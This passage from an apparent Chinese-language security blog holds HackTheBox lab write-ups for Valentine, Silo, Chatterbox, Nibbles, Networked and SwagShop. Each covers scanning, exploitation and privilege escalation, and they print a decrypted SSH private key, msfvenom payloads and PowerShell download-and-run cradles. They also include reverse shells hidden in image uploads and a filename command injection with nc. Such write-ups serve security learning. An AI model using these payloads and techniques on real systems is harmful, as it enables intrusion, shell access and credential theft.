(RSA)|_ 256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)80/tcp open http Apache httpd 2.2.22 ((Ubuntu))|_http-server-header: Apache/2.2.22 (Ubuntu)|_http-title: Site doesn't have a title (text/html).443/tcp open ssl/http Apache httpd 2.2.22 ((Ubuntu))|_http-server-header: Apache/2.2.22 (Ubuntu)|_http-title: Site doesn't have a title (text/html).| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US| Not valid before: 2018-02-06T00:45:25|_Not valid after: 2019-02-06T00:45:25|_ssl-date: 2021-02-10T03:01:00+00:00; 0s from scanner time.Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 30.68 seconds 80/443一张图，暗示heartbleed： heartbleed https://github.com/sensepost/heartbleed-poc 删除空行，多次运行得到一些结果 123456python heartbleed-poc.py 10.10.10.79 | grep -v &quot;00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00&quot;&#x2F;encode.php&#x2F;decode.phpdecode.php..Content-Type: application&#x2F;x-www-form-urlencoded..Content-Length: 42....$text&#x3D;aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg&#x3D;&#x3D;base64 decode ： heartbleedbelievethehype 目录扫描目录扫描发现dev： 123456789101112gobuster dir -u http://10.10.10.79/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50/.htpasswd (Status: 403)/.hta (Status: 403)/cgi-bin/ (Status: 403)/decode (Status: 200)/dev (Status: 301)/encode (Status: 200)/.htaccess (Status: 403)/index (Status: 200)/index.php (Status: 200)/server-status (Status: 403) hype_key是16进制，notes.txt里一些信息 hype_key直接xxd转换后是加密后的ssh私钥： 1234567891011121314151617181920212223242526272829303132cat hype_key | xxd -r -p-----BEGIN RSA PRIVATE KEY-----Proc-Type: 4,ENCRYPTEDDEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R5y&#x2F;b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1&#x2F;gjB&#x2F;7&#x2F;My00Mwx+aI60EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXiEbw66hjFmAu4AzqcM&#x2F;kigNRFPYuNiXrXs1w&#x2F;deLCqCJ+Ea1T8zlas6fcmhM8A+8POXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGdpHLJpYUII5PuO6x+LS8n1r&#x2F;GWMqSOEimNRD1j&#x2F;59&#x2F;4u3ROrTCKeo9DsTRqs2k1SHQdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+Ep0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uCOl6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulOt9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDKaAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ+wQ87lMadds1GQNeGsKSf8R&#x2F;rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1EAloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Qr08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89&#x2F;RZ5oSQe2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPkye1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc&#x2F;LVjmbhZzKwLhaZRNd8HEM86fNojP09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CCdYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK&#x2F;iaL3X1R3DxV8eSYFKFL6pqpuXcY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk&#x2F;9fyX6op24rL2DyESpYpnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAjMslf+9xK+TXEL3icmIOBRdPyw6e&#x2F;JlQlVRlmShFpI8eb&#x2F;8VsTyJSe+b853zuV2qLsuLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC&#x2F;wUyUXlMJ50Nw6JNVMM8LeCii3OEWl0ln9L1b&#x2F;NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW&#x2F;IzTRUgZkbMQZNIIfzj1QuilRVBm&#x2F;F76Y&#x2F;YMrmnM9k&#x2F;1xSGIskwCUQ+95CGHJE8MkhD3-----END RSA PRIVATE KEY----- hype_id_rsa直接openssl解密出来私钥，密码就是前面base64解码得到的： 1234567891011121314151617181920212223242526272829openssl rsa -in hype_id_rsa -out hype_id_rsa_decrypt-----BEGIN RSA PRIVATE KEY-----MIIEpQIBAAKCAQEA1FN4mXAwn3ggiDC&#x2F;N+BcdmEBf0yMl6IulSOkv9WfUrGTPTUocFHUa95jyaHFjme0c7hG6URWS9c4JMpB35&#x2F;KUdFnOpI0MOJQlRldt+4qlpRvjEhkVTj7g0tVJmjd3Temyy+eNSzaU7HBOEWzcz4T+qQ+aSrEl+yHDLAH8mfa6X2SrnIktC16W00upKJK67uvzDNbtw5HH8bklvB3jupVkO7GwjC2wqfVoypgUZcTGOCY9LVLM&#x2F;H+urxmh8VomlMwRcuZvNqnwsi&#x2F;TeGK6NcXtURfLgufIvKxP22g81thjCuyVXALz4rp7tidEHloPLFTsrSy8T1cT6zyg2+wgRJMzQIDAQABAoIBACBqAc5C31lpCGZiMr8ABH2Z&#x2F;5WEhS4c90mTYHJc1W7VZyn&#x2F;9IV5KJmzIL7GcJd144mLB2BTK212lL6hFf9isItfEYhSi58u3ah1b+ZFeMD2NjVPU+niwhrgJEax2bUM6uy3&#x2F;0oU59vBFkNV+LhOMNShwFljyxF6bX+VXBE4o6XjW464FTD&#x2F;zGplsB5MrygXNvkx14MwXhKPpjLD3FF2HZiPmsavH925VGfMxLLj1V2T1xrpEwkzimATrOvlXN00BZqqmm643QJrJrglsnkFn8&#x2F;cBMxuWlzw1tHrSFmO8Yns+JVABP0ci9jmvVhLidqqHshl3DmMhb3tS4nA3pTc0Q0CgYEA7i1QecUryhtCttc3dzQVCZdmkD9Sr7f7r&#x2F;ne7jNVNq&#x2F;n&#x2F;VUh6ZYIELq+Ouip+RneR7cpov1s+COF+KyJW5LCNtqmC+7wtYMSWfdSmfMco+pRWQvFHVa8KC1C2qybYWgxD1gRjDbWvNdarOq7NGVBBE5W2lpm2nO0s3Bkd53oNG8CgYEA5DbwFP2Q47N2TgtedOwsCKE3uzGGSV3FTRB3HZoOLBcc3CYBM1kQZpcThl5YVLvc6r6TxQRhKc73QR2GFLD03yYBN7HwgOPtU&#x2F;t7m2dIKJRgSkLYE&#x2F;G+iZ1OxNJsTWREQ34byVXhxgpm4LEelfAN4+mbub8ELEi9b2G9Wg4kCIMCgYEAxPQv4iJMDbrxNiVONoKZCu9p3sqeY7Ruqpyj3rIQO0LHQlQN0Q1B6iOifzA6rkTX7NHn2mJao+8sL&#x2F;DtPQ5lD9tLB&#x2F;80icSzfjXo1mmVO27eihYTkClTOp4C9LVbX&#x2F;c66odXK22FsW8cCnWpDLDWTOtDIxkyiF66BNBiJBAuHn0CgYEAk3VUB5wXxKku5hq+e7omcaUKB7BmXn1ygOsErGHgimicwzrjR7RivocbnJTValrA0gU2IfVEeuk6Jh7XhgMZFh7OZphZGE8uCDfUlINVwrKszQ8H40sunGjCfragOBlzalDPz3XonjgWZVTMuIEV2JAXiRt9rMeLb66t1MSST9UCgYEAnto5uquA7UPpk7zgawoqR+kXhlOy1RpO1OwNxJXAi&#x2F;EB99k0QL5mvEgeEwRP&#x2F;+S8UCRvLGdHrnHg6GyCEQMYNuUGtOVqNRw2ezIrpU7RybdTFN&#x2F;gX+6StpUEwXFAuMcDkksSNTLIJC2sa7eJFpHqeajJWAc30qOO1IBlNVoehxA&#x3D;-----END RSA PRIVATE KEY----- notes.txt12345678To do:1) Coffee.2) Research.3) Fix decoder&#x2F;encoder before going live.4) Make sure encoding&#x2F;decoding is only done client-side.5) Don&#39;t use the decoder&#x2F;encoder until any of this is done.6) Find a better way to take notes. user flag然后直接ssh登录，桌面得到user.txt: 提权信息root用户运行着tmux： root flag直接tmux连上去，得到root.txt: 参考资料 https://github.com/sensepost/heartbleed-poc HTB: Valentine | 0xdf hacks stuffhttps://0xdf.gitlab.io/2018/07/28/htb-valentine.html https://www.hackthebox.eu/home/machines/writeup/127 HackTheBox - Valentine - YouTubehttps://www.youtube.com/watch?v=XYXNvemgJUo&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Silo - HackTheBox","slug":"Silo-HackTheBox","date":"2020-02-22T06:09:26.000Z","updated":"2021-02-09T06:11:36.714Z","comments":true,"path":"2020/02/22/Silo-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/22/Silo-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/131 10.10.10.82 端口扫描80，1521,还有其他一些windows端口： 123456789101112131415161718192021222324252627282930313233343536373839$ nmap -sC -sV 10.10.10.82Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-09 13:15 CSTNmap scan report for 10.10.10.82Host is up (0.073s latency).Not shown: 988 closed portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 8.5| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/8.5|_http-title: IIS Windows Server135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds1521/tcp open oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)49152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49159/tcp open oracle-tns Oracle TNS listener (requires service name)49160/tcp open msrpc Microsoft Windows RPC49161/tcp open msrpc Microsoft Windows RPCService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: supported| smb2-security-mode:| 2.02:|_ Message signing enabled but not required| smb2-time:| date: 2021-02-09T05:17:36|_ start_date: 2021-02-09T03:07:49Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 152.90 seconds 80IIS默认页面： 15211521是oracle，针对oracle有专门的工具： quentinhardy/odat: ODAT: Oracle Database Attacking Toolhttps://github.com/quentinhardy/odat oracle主要就是针对oracle的一步步操作 sid首先利用odat获取sid： 12345678910111213➜ ~ odat sidguesser -s 10.10.10.82[1] (10.10.10.82:1521): Searching valid SIDs[1.1] Searching valid SIDs thanks to a well known SID list on the 10.10.10.82:1521 server[+] 'XE' is a valid SID. Continue... ########## | ETA: 00:00:01[+] 'XEXDB' is a valid SID. Continue...100% |#######################################################| Time: 00:02:22[1.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.10.10.82:1521)100% |#######################################################| Time: 00:00:05[1.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.10.10.82:1521)[+] 'XE' is a valid SID. Continue... #### | ETA: 00:00:15100% |#######################################################| Time: 00:02:22[+] SIDs found on the 10.10.10.82:1521 server: XE,XEXDB 用户密码爆破然后爆破用户名密码： 123➜ ~ sudo odat passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file /usr/share/odat/accounts/accounts_small.txt[+] Valid credentials found: scott/tiger. Continue... 4:05 Getshell数据库里没什么东西，这里用的是上传恶意文件执行： 12345msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.5 lport=4445 -f exe &gt; miao.exeodat utlfile -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ miao.exe /home/miao/Desktop/HTB/Silo/miao.exeodat externaltable -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ miao.exe flags打到的直接是system shell，读取user.txt和root.txt: 12type C:\\Users\\Phineas\\Desktop\\user.txttype C:\\Users\\Administrator\\Desktop\\root.txt odatodat太强了，直接用odat读文件也可以： 1odat ctxsys -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --getFile c:\\\\users\\\\administrator\\\\desktop\\\\root.txt 参考资料 quentinhardy/odat: ODAT: Oracle Database Attacking Toolhttps://github.com/quentinhardy/odat HTB: Silo | 0xdf hacks stuffhttps://0xdf.gitlab.io/2018/08/04/htb-silo.html https://www.hackthebox.eu/home/machines/writeup/131 HackTheBox - Silo - YouTubehttps://www.youtube.com/watch?v=2c7SzNo9uoA&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Chatterbox - HackTheBox","slug":"Chatterbox-HackTheBox","date":"2020-02-21T06:35:24.000Z","updated":"2021-02-08T06:36:34.747Z","comments":true,"path":"2020/02/21/Chatterbox-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/21/Chatterbox-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/123 10.10.10.74 端口扫描需要UDP全端口，非常见端口9255和9256: 1234567891011$ sudo nmap -sU -p9255,9256 10.10.10.74Password:Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-08 14:29 CSTNmap scan report for 10.10.10.74Host is up (0.084s latency).PORT STATE SERVICE9255/udp open|filtered mon9256/udp open|filtered unknownNmap done: 1 IP address (1 host up) scanned in 2.09 seconds 9256搜索相关资料，这是Achat端口： Port 9256 (tcp/udp) :: SpeedGuidehttps://www.speedguide.net/port.php?port=9256 Achat bof Achat 0.150 beta7 - Remote Buffer Overflow - Windows remote Exploithttps://www.exploit-db.com/exploits/36025 exploitmsf里的模块打到的meterpreter几秒后就会断，加上auto migrate也一样： Powershell 执行方式换成powershell reverse就可以，比较稳定： 1msfvenom -a x86 --platform Windows -p windows&#x2F;exec CMD&#x3D;&quot;powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;10.10.14.6:7777&#x2F;Invoke-PowerShellTcp.ps1&#39;)&quot; 。。。 user flagalfred用户桌面得到user flag: 提权信息预期powerup可以发现注册表中的密码 123456789101112IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.6:7777/PowerUp.ps1')Invoke-AllChecks[*] Checking for Autologon credentials in registry...DefaultDomainName :DefaultUserName : AlfredDefaultPassword : Welcome1!AltDefaultDomainName :AltDefaultUserName :AltDefaultPassword : 这个密码就是管理员密码 非预期权限配置错误，Alfred对root.txt没有权限，但对Desktop有权限： 提权 &amp;&amp; root flagicacls直接修改权限后读取root.txt: Administrator使用密码得到Administrator session,执行reverse shell: 123$passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force;$creds = New-Object System.Management.Automation.PSCredential('administrator',$passwd);Start-Process -FilePath \"powershell\" -argumentlist \"IEX(New-Object Net.webClient).downloadString('http://10.10.14.6:7777/Invoke-PowerShellTcp.ps1')\" -Credential $creds 参考资料 Port 9256 (tcp/udp) :: SpeedGuidehttps://www.speedguide.net/port.php?port=9256 Achat 0.150 beta7 - Remote Buffer Overflow - Windows remote Exploithttps://www.exploit-db.com/exploits/36025 HTB: Chatterbox | 0xdf hacks stuffhttps://0xdf.gitlab.io/2018/06/18/htb-chatterbox.html https://www.hackthebox.eu/home/machines/writeup/123 HackTheBox - Chatterbox - YouTubehttps://www.youtube.com/watch?v=_dRrvJNdP-s&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Nibbles - HackTheBox","slug":"Nibbles-HackTheBox","date":"2020-02-20T07:49:58.000Z","updated":"2021-02-06T07:52:02.403Z","comments":true,"path":"2020/02/20/Nibbles-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/20/Nibbles-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/121 10.10.10.75 端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV 10.10.10.75Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-06 15:14 CSTNmap scan report for 10.10.10.75Host is up (0.35s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)| 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)|_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Site doesn't have a title (text/html).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 811.86 seconds 8080就一个helloworld，注释里面有目录： 是个Nibbleblog： Nibbleblog直接默认登录： 12http:&#x2F;&#x2F;10.10.10.75&#x2F;nibbleblog&#x2F;admin.phpadmin&#x2F;nibbles exploit直接搜到个任意文件上传，msf有模块一键打： Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit) - PHP remote Exploithttps://www.exploit-db.com/exploits/38489 user flag直接用户目录得到user.txt： 提权信息Sudo -l 发现monitor.sh： 1python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; Personal.zip自己解压后就有相关文件： 1unzip personal.zip monitor.sh我们有可写权限，那就直接修改内容即可 monitor.sh12#!&#x2F;bin&#x2F;shbash 提权 &amp;&amp; root flag直接修改内容，运行，得到root shell： 123wget http://10.10.14.10:7777/monitor.shchmod +x monitor.shsudo /home/nibbler/personal/stuff/monitor.sh 参考资料 Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit) - PHP remote Exploithttps://www.exploit-db.com/exploits/38489 https://www.hackthebox.eu/home/machines/writeup/121 HackTheBox - Nibbles - YouTubehttps://www.youtube.com/watch?v=s_0GcRGv6Ds&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Networked - HackTheBox","slug":"Networked-HackTheBox","date":"2020-02-19T03:03:15.000Z","updated":"2021-02-05T03:04:46.923Z","comments":true,"path":"2020/02/19/Networked-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/19/Networked-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/203 10.10.10.146 端口扫描22和80: 123456789101112131415➜ ~ nmap -sC -sV 10.10.10.146Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-30 01:56 ESTWarning: 10.10.10.146 giving up on port because retransmission cap hit (10).Nmap scan report for 10.10.10.146Host is up (0.070s latency).Not shown: 995 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4 (protocol 2.0)| ssh-hostkey:| 2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)| 256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)|_ 256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16|_http-title: Site doesn't have a title (text/html; charset=UTF-8). 8080就一段文字： 目录扫描简单的目录扫描，发现backup和uploads： 123456789gobuster dir -u http://10.10.10.146/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50/.hta (Status: 403)/.htaccess (Status: 403)/.htpasswd (Status: 403)/backup (Status: 301)/cgi-bin/ (Status: 403)/index.php (Status: 200)/uploads (Status: 301) backupbackup里有个tar，是4个php文件： upload &amp;&amp; shellupload就是文件上传，根据backup里的代码，有后缀名校验和文件头校验只能上传图片，但用的php的finfo_file函数，很容易bypass： Photo.php里可以看到上传后的文件： shell.gif1234GIF89a;&lt;?phpsystem(&quot;bash -c &#39;exec bash -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.10.14.10&#x2F;4445 &lt;&amp;1&#39;&quot;);?&gt; reverse shell 然后去访问触发reverse shell： guly在guly用户目录可以看到有个check_attack.php,查看代码可以看到是uploads目录进行检测处理，里面有明显的命令注入： 1exec(&quot;nohup &#x2F;bin&#x2F;rm -f $path$value &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 &amp;&quot;); value就是文件名，我们可控 命令注入直接Touch有点问题，可以base64编码： 123echo &quot;nc -e &#x2F;bin&#x2F;bash 10.10.14.10 4446&quot; | base64bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LjEwIDQ0NDYKtouch &#39;; echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LjEwIDQ0NDYK | base64 -d | sh; b&#39; guly shell然后等待触发，得到guly shell： check_attack.php1234567891011121314151617181920212223242526272829303132333435&lt;?phprequire '/var/www/html/lib.php';$path = '/var/www/html/uploads/';$logpath = '/tmp/attack.log';$to = 'guly';$msg= '';$headers = \"X-Mailer: check_attack.php\\r\\n\";$files = array();$files = preg_grep('/^([^.])/', scandir($path));foreach ($files as $key =&gt; $value) &#123; $msg=''; if ($value == 'index.html') &#123; continue; &#125; #echo \"-------------\\n\"; #print \"check: $value\\n\"; list ($name,$ext) = getnameCheck($value); $check = check_ip($name,$value); if (!($check[0])) &#123; echo \"attack!\\n\"; # todo: attach file file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX); exec(\"rm -f $logpath\"); exec(\"nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;\"); echo \"rm -f $path$value\\n\"; mail($to, $msg, $msg, $headers, \"-F$value\"); &#125;&#125;?&gt; user flagGuly 用户目录得到user.txt: 提权信息Sudo -l发现changename.sh： 查看代码，就是调用ifcfg，输入几个变量： Full Disclosure: Redhat/CentOS root through network-scriptshttps://seclists.org/fulldisclosure/2019/Apr/24 根据这个，变量那里可以直接执行任意命令 changename.sh123456789101112131415161718192021#!/bin/bash -pcat &gt; /etc/sysconfig/network-scripts/ifcfg-guly &lt;&lt; EoFDEVICE=guly0ONBOOT=noNM_CONTROLLED=noEoFregexp=\"^[a-zA-Z0-9_\\ /-]+$\"for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do echo \"interface $var:\" read x while [[ ! $x =~ $regexp ]]; do echo \"wrong input, try again\" echo \"interface $var:\" read x done echo $var=$x &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-gulydone/sbin/ifup guly0 提权 &amp;&amp; root flag所以就可以直接执行bash，得到root： 参考资料 Full Disclosure: Redhat/CentOS root through network-scriptshttps://seclists.org/fulldisclosure/2019/Apr/24 HTB: Networked | 0xdf hacks stuffhttps://0xdf.gitlab.io/2019/11/16/htb-networked.html https://www.hackthebox.eu/home/machines/writeup/203 HackTheBox - Networked - YouTubehttps://www.youtube.com/watch?v=H3t3G70bakM&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"SwagShop - HackTheBox","slug":"SwagShop-HackTheBox","date":"2020-02-18T07:12:26.000Z","updated":"2021-02-04T07:13:40.555Z","comments":true,"path":"2020/02/18/SwagShop-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/18/SwagShop-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/188 10.10.10.140 端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV 10.10.10.140Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-04 13:27 CSTNmap scan report for 10.10.10.140Host is up (0.072s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)| 256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)|_ 256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Home pageService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 28.17 seconds 80是一个Magento： MagentoMagento默认的RELEASE_NOTES.txt里只到1.7.02，页面也显示2014，很老的版本： 老版本很多漏洞，组合利用，sql注入添加管理员用户，然后认证后的RCE： Magento-Shoplift-SQLI/poc.py at master · joren485/Magento-Shoplift-SQLIhttps://github.com/joren485/Magento-Shoplift-SQLI/blob/master/poc.py Magento 1.9.0.1 PHP Object Injection | Reiners’ Webloghttps://websec.wordpress.com/2014/12/08/magento-1-9-0-1-poi/ Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution - PHP webapps Exploithttps://www.exploit-db.com/exploits/37811 add admin脚本通过sql注入添加管理员账号，然后登录： rce需要修改脚本里的用户名密码和安装日期，日期可以通过接口得到,因为历史问题脚本错误需要自己调： 12curl -s 10.10.10.140&#x2F;app&#x2F;etc&#x2F;local.xml | grep date &lt;date&gt;&lt;![CDATA[Wed, 08 May 2019 07:23:09 +0000]]&gt;&lt;&#x2F;date&gt; webshell另一种方式是直接上传webshell： System -&gt; Configuration -&gt; Developer: Catalog—Manage Categories Newsletter—Newsletter Templates 1&#123;&#123;block type&#x3D;&#39;core&#x2F;template&#39; template&#x3D;&#39;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;media&#x2F;catalog&#x2F;category&#x2F;miao.php.png&#39;&#125;&#125; 然后预览触发： miao.php.png123&lt;?phppassthru(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.5 4445 &gt;/tmp/f\");?&gt; https://www.php.net/manual/zh/function.passthru.php user flagharis用户目录得到user.txt: 提权信息 可以无密码sudo vi编辑指定目录文件： 利用方式： https://gtfobins.github.io/gtfobins/vi/#sudo 提权 &amp;&amp; root flag可以vi运行shell，也可以直接路径穿越读root.txt: 12sudo /usr/bin/vi /var/www/html/php.ini.sample -c ':!/bin/bash'sudo /usr/bin/vi /var/www/html/../../../root/root.txt 参考资料 Magento-Shoplift-SQLI/poc.py at master · joren485/Magento-Shoplift-SQLIhttps://github.com/joren485/Magento-Shoplift-SQLI/blob/master/poc.py Magento 1.9.0.1 PHP Object Injection | Reiners’ Webloghttps://websec.wordpress.com/2014/12/08/magento-1-9-0-1-poi/ Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution - PHP webapps Exploithttps://www.exploit-db.com/exploits/37811 HTB{ Swagshop }https://epi052.gitlab.io/notes-to-self/blog/2019-09-12-hack-the-box-swagshop/ Swagshop RCE — Hack The Box :: Forumshttps://forum.hackthebox.eu/discussion/2304/swagshop-rce HacktheBox ‘SwagShop’ writeuphttps://initinfosec.com/writeups/htb/2020/02/01/swagshop-htb-writeup/ https://www.php.net/manual/zh/function.passthru.php https://gtfobins.github.io/gtfobins/vi/#sudo HTB: SwagShop | 0xdf hacks stuffhttps://0xdf.gitlab.io/2019/09/28/htb-swagshop.html https://www.hackthebox.eu/home/machines/writeup/188 HackTheBox - Swagshop - YouTubehttps://www.youtube.com/watch?v=qECG2_8xw_s&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"SecNotes - HackTheBox","slug":"SecNotes-HackTheBox","date":"2020-02-17T07:48:20.000Z","updated":"2021-02-03T07:49:44.205Z","comments":true,"path":"2020/02/17/SecNotes-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/17/SecNotes-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/151 10.10.10.97 端口扫描80,445,8808: 1234567891011$ nmap -sT -p- --min-rate 10000 10.10.10.97Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-03 14:00 CSTNmap scan report for 10.10.10.97Host is up (0.070s latency).Not shown: 65532 filtered portsPORT STATE SERVICE80/tcp open http445/tcp open 